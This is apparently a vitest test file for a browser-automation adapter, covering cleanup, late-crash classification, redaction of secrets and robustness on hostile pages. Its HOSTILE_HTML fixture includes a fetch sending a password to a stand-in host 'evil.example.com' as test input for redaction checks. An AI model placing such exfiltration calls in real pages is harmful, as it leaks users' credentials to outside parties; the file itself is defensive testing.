import { describe, it, expect, afterEach } from "vitest";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { readdirSync } from "node:fs";
import type { Action } from "@inspector/protocol";
import { WebAdapterHandler } from "./web-adapter.js";

const ART_BASE = join(tmpdir(), "inspector-web-hardening");

function act(id: string, kind: string, input?: Record<string, unknown>): Action {
  return { id, runId: "run", environmentId: "env", kind, risk: "interact", deadlineMs: 10000, idempotency: "safe-retry", input } as Action;
}

interface Internals {
  browser?: { isConnected(): boolean };
  page?: {
    route(pattern: string, handler: (route: { fulfill(opts: Record<string, unknown>): Promise<void>; abort(): Promise<void>; continue(): Promise<void> }) => Promise<void>): Promise<void>;
  };
}

let handler: WebAdapterHandler | null = null;

afterEach(async () => {
  if (handler) {
    await handler.lifecycle({ op: "close" }).catch(() => {});
    handler = null;
  }
});

async function fresh(
  opts: { seedHtml?: string; settleMs?: number; seedRedirectLoop?: boolean } = {},
): Promise<WebAdapterHandler> {
  handler = new WebAdapterHandler(
    {},
    ART_BASE,
    opts.seedHtml,
    opts.settleMs,
    opts.seedRedirectLoop,
  );
  await handler.lifecycle({ op: "create" });
  return handler;
}

const HOSTILE_HTML = `<!doctype html><html><head><meta charset="utf-8"><title>Hostile</title></head><body>
<input id="username" aria-label="username"/>
<input id="password" aria-label="password" type="password"/>
<button id="selfRemove" role="button">Remove me</button>
<button id="reloadNow" role="button">Reload</button>
<button id="callApi" role="button">Call API</button>
<button id="callGone" role="button">Call gone</button>
<script>
  localStorage.setItem('accessToken', 'hunter2');
  localStorage.setItem('pref', 'saved-1');
  for (let i = 0; i < 300; i++) console.error('storm ' + i + ' GET https://user:pass@api.example.com/v1?token=abc');
  fetch('https://evil.example.com/steal?password=pw').catch(function () {});
  document.getElementById('selfRemove').addEventListener('click', function () { this.remove(); });
  document.getElementById('reloadNow').addEventListener('click', function () { location.reload(); });
  document.getElementById('callApi').addEventListener('click', function () {
    fetch('/api').then(function (r) { return r.text(); }).catch(function () {});
  });
  document.getElementById('callGone').addEventListener('click', function () {
    fetch('/gone').then(function (r) { return r.text(); }).catch(function () {});
  });
</script>
</body></html>`;

const LATE_BOOM_HTML = (delayMs: number) => `<!doctype html><html><head><meta charset="utf-8"><title>LateBoom</title></head><body>
<button id="lateBoom" role="button">Late boom</button>
<script>
document.getElementById('lateBoom').addEventListener('click', function () {
  setTimeout(function () { throw new Error('LateCrash'); }, ${delayMs});
});
</script>
</body></html>`;

const DENYING_CLEAR_HTML = `<!doctype html><html><head><meta charset="utf-8"><title>DenyClear</title></head><body>
<p id="msg">hi</p>
<script>
localStorage.setItem('k', 'v');
localStorage.clear = function () { throw new Error('denied'); };
</script>
</body></html>`;

describe("web hardening: create/cleanup cluster (D2)", () => {
  it("a second create replaces the prior instance without leaking it", async () => {
    const h = await fresh();
    const obs1 = (await h.observe({})) as unknown as { summary: { url: string } };
    const firstUrl = obs1.summary.url;
    await h.lifecycle({ op: "create" });
    const obs2 = (await h.observe({})) as unknown as { summary: { url: string } };
    expect(obs2.summary.url).not.toBe(firstUrl);
    // The replaced instance's seed server must be gone.
    await expect(fetch(firstUrl)).rejects.toThrow();
    expect((h as unknown as Internals).browser?.isConnected()).toBe(true);
  });

  it("traces are stored under the run's artifact dir and leave nothing in the os tmpdir", async () => {
    const tmp = tmpdir();
    const isStray = (f: string) => /^inspector-trace-\d+\.zip$/.test(f);
    const before = new Set(readdirSync(tmp).filter(isStray));
    const h = await fresh();
    for (let i = 0; i < 2; i++) {
      const obs = (await h.observe({ observe: ["uiTree", "trace"] })) as unknown as {
        artifacts: Array<{ mime: string; sha256: string; path: string; size: number }>;
      };
      const trace = obs.artifacts.find((a) => a.mime === "application/zip");
      expect(trace, `flush ${i}`).toBeDefined();
      expect(trace!.size).toBeGreaterThan(0);
    }
    await h.lifecycle({ op: "close" });
    const strays = readdirSync(tmp).filter(isStray).filter((f) => !before.has(f));
    expect(strays).toEqual([]);
  });

  it("reset reports storage-clear failure honestly instead of ok:true", async () => {
    const h = await fresh({ seedHtml: DENYING_CLEAR_HTML });
    const result = await h.lifecycle({ op: "reset" });
    expect(result.ok).toBe(false);
  });
});

describe("web hardening: late-throw classification (D3)", () => {
  it("classifies an uncaught throw arriving within the configured settle window", async () => {
    const h = await fresh({ seedHtml: LATE_BOOM_HTML(120), settleMs: 300 });
    const outcome = await h.act({ action: act("lb1", "click", { selector: "#lateBoom" }) });
    expect(outcome.status).toBe("target-failure");
    expect(outcome.error?.code).toBe("TARGET_FAILURE");
    expect(outcome.error?.message).toContain("LateCrash");
  });

  it("documents the residual race: throws well beyond the default settle window are missed", async () => {
    // KNOWN LIMITATION (pinned characterization): with the default 50ms
    // settle, a pageerror landing long after the action resolved reads as
    // success. Reproduction policy mitigates this by replaying paths; the
    // window is configurable via the settleMs constructor option. The 600ms
    // delay keeps this deterministic under normal scheduling.
    const h = await fresh({ seedHtml: LATE_BOOM_HTML(600) });
    const outcome = await h.act({ action: act("lb2", "click", { selector: "#lateBoom" }) });
    expect(outcome.status).toBe("success");
  }, 20000);

  it("an action-time Playwright timeout with a concurrent pageerror classifies TARGET_FAILURE", async () => {
    const h = await fresh({
      seedHtml: `<!doctype html><html><body><script>
        setTimeout(function () { throw new Error('BackgroundCrash'); }, 30);
      </script></body></html>`,
    });
    // Wait past the background crash, then perform an action on a missing
    // element: the miss coincides with an already-recorded page error only if
    // it arrived during THIS action window; here it arrived before, so the
    // expectation is a plain automation-miss classification.
    await new Promise((r) => setTimeout(r, 300));
    const outcome = await h.act({ action: act("mm", "click", { selector: "#missing" }) });
    expect(outcome.status).toBe("target-failure");
    expect(outcome.error?.code).toBe("ACTION_FAILED");
  });
});

describe("web hardening: secret redaction (D7)", () => {
  it("masks password-field values and sensitive storage keys in observations", async () => {
    const h = await fresh({ seedHtml: HOSTILE_HTML });
    await h.act({ action: act("p1", "fill", { selector: "#username", value: "admin" }) });
    await h.act({ action: act("p2", "fill", { selector: "#password", value: "hunter2" }) });
    const obs = (await h.observe({ observe: ["uiTree", "storage"] })) as unknown as {
      summary: { uiTree: Array<{ id?: string; value?: string }>; storage: Record<string, string> };
    };
    const pw = obs.summary.uiTree.find((e) => e.id === "password");
    expect(pw?.value).toBe("***");
    const user = obs.summary.uiTree.find((e) => e.id === "username");
    expect(user?.value).toBe("admin");
    expect(obs.summary.storage["accessToken"]).toBe("***");
    expect(obs.summary.storage["pref"]).toBe("saved-1");
  });

  it("redacts credentials and sensitive query params in console and network captures", async () => {
    const h = await fresh({ seedHtml: HOSTILE_HTML });
    const obs = (await h.observe({ observe: ["console", "network"] })) as unknown as {
      summary: { consoleErrors: Array<{ text: string }>; network: Array<{ type: string; url: string }> };
    };
    const joinedConsole = obs.summary.consoleErrors.map((c) => c.text).join("\n");
    expect(joinedConsole).not.toContain("user:pass");
    expect(joinedConsole).not.toContain("token=abc");
    const joinedUrls = obs.summary.network.map((n) => n.url).join("\n");
    expect(joinedUrls).not.toContain("user:pass");
    expect(joinedUrls).not.toContain("password=pw");
  });
});

describe("web hardening: attribution threading (D8)", () => {
  it("threads real run/environment ids from lifecycle options into observations", async () => {
    handler = new WebAdapterHandler({}, ART_BASE);
    await handler.lifecycle({ op: "create", options: { runId: "r42", environmentId: "e7" } });
    const obs = (await handler.observe({})) as unknown as { runId: string; environmentId: string };
    expect(obs.runId).toBe("r42");
    expect(obs.environmentId).toBe("e7");
  });
});

describe("web torture (seeded-server only)", () => {
  it("empty page observes cleanly and missing-element clicks are automation misses", async () => {
    const h = await fresh({ seedHtml: "<html><body></body></html>" });
    const obs = (await h.observe({})) as unknown as { summary: { uiTree: unknown[]; title: string } };
    expect(obs.summary.uiTree).toEqual([]);
    const outcome = await h.act({ action: act("e1", "click", { selector: "#missing" }) });
    expect(outcome.status).toBe("target-failure");
    expect(outcome.error?.code).toBe("ACTION_FAILED");
  });

  it("a huge accessibility tree (1200 controls) observes without choking", async () => {
    const buttons = Array.from({ length: 1200 }, (_, i) => `<button role="button">b${i}</button>`).join("");
    const h = await fresh({
      seedHtml: `<!doctype html><html><body>${buttons}</body></html>`,
    });
    const obs = (await h.observe({})) as unknown as { summary: { uiTree: unknown[] } };
    expect(obs.summary.uiTree.length).toBe(1200);
  }, 45000);

  it("console storms are captured and drained per observation", async () => {
    const h = await fresh({ seedHtml: HOSTILE_HTML });
    const o1 = (await h.observe({ observe: ["console"] })) as unknown as {
      summary: { consoleErrors: Array<{ text: string }> };
    };
    const storm = o1.summary.consoleErrors.filter((c) => c.text.startsWith("storm "));
    expect(storm.length).toBe(300);
    const o2 = (await h.observe({ observe: ["console"] })) as unknown as {
      summary: { consoleErrors: Array<{ text: string }> };
    };
    expect(o2.summary.consoleErrors.filter((c) => c.text.startsWith("storm ")).length).toBe(0);
  });

  it("stale/detached DOM during act resolves without crashing the adapter", async () => {
    const h = await fresh({ seedHtml: HOSTILE_HTML });
    const outcome = await h.act({ action: act("sr", "click", { selector: "#selfRemove" }) });
    expect(["success", "target-failure"]).toContain(outcome.status);
  });

  it("navigation triggered during an action resolves within the deadline", async () => {
    const h = await fresh({ seedHtml: HOSTILE_HTML });
    const outcome = await h.act({ action: act("rn", "click", { selector: "#reloadNow" }) });
    expect(["success", "target-failure"]).toContain(outcome.status);
  });

  it("network 5xx/delayed/aborted responses are observed and never crash the adapter", async () => {
    const h = await fresh({ seedHtml: HOSTILE_HTML });
    const internals = h as unknown as Internals;
    const page = internals.page!;
    // Register interception BEFORE triggering the fetches (the seed server
    // would otherwise answer every path with 200).
    await page.route("**/api", async (route) => {
      await new Promise((r) => setTimeout(r, 150));
      await route.fulfill({ status: 500, contentType: "text/plain", body: "boom" });
    });
    await page.route("**/gone", async (route) => {
      await route.abort();
    });
    await h.act({ action: act("api", "click", { selector: "#callApi" }) });
    await h.act({ action: act("gone", "click", { selector: "#callGone" }) });
    // The /api route fulfills after a 150ms delay; give it time to land
    // before draining the network capture.
    await new Promise((r) => setTimeout(r, 500));
    const obs = (await h.observe({ observe: ["network"] })) as unknown as {
      summary: { network: Array<{ type: string; url: string; status?: number }> };
    };
    const apiRes = obs.summary.network.find(
      (n) => n.type === "response" && n.url.includes("/api"),
    );
    expect(apiRes?.status).toBe(500);
    const goneReq = obs.summary.network.find(
      (n) => n.type === "request" && n.url.includes("/gone"),
    );
    expect(goneReq).toBeDefined();
    expect(obs.summary.network.some((n) => n.type === "response" && n.url.includes("/gone"))).toBe(false);
  });

  it("redirect loops fail the navigate action instead of hanging", async () => {
    const h = await fresh({ seedHtml: HOSTILE_HTML, seedRedirectLoop: true });
    const obs = (await h.observe({})) as unknown as { summary: { url: string } };
    const origin = new URL(obs.summary.url).origin;
    const outcome = await h.act({ action: act("lp", "navigate", { value: `${origin}/loop` }) });
    expect(outcome.status).toBe("target-failure");
    expect(outcome.error?.code).toBe("ACTION_FAILED");
  }, 30000);
});
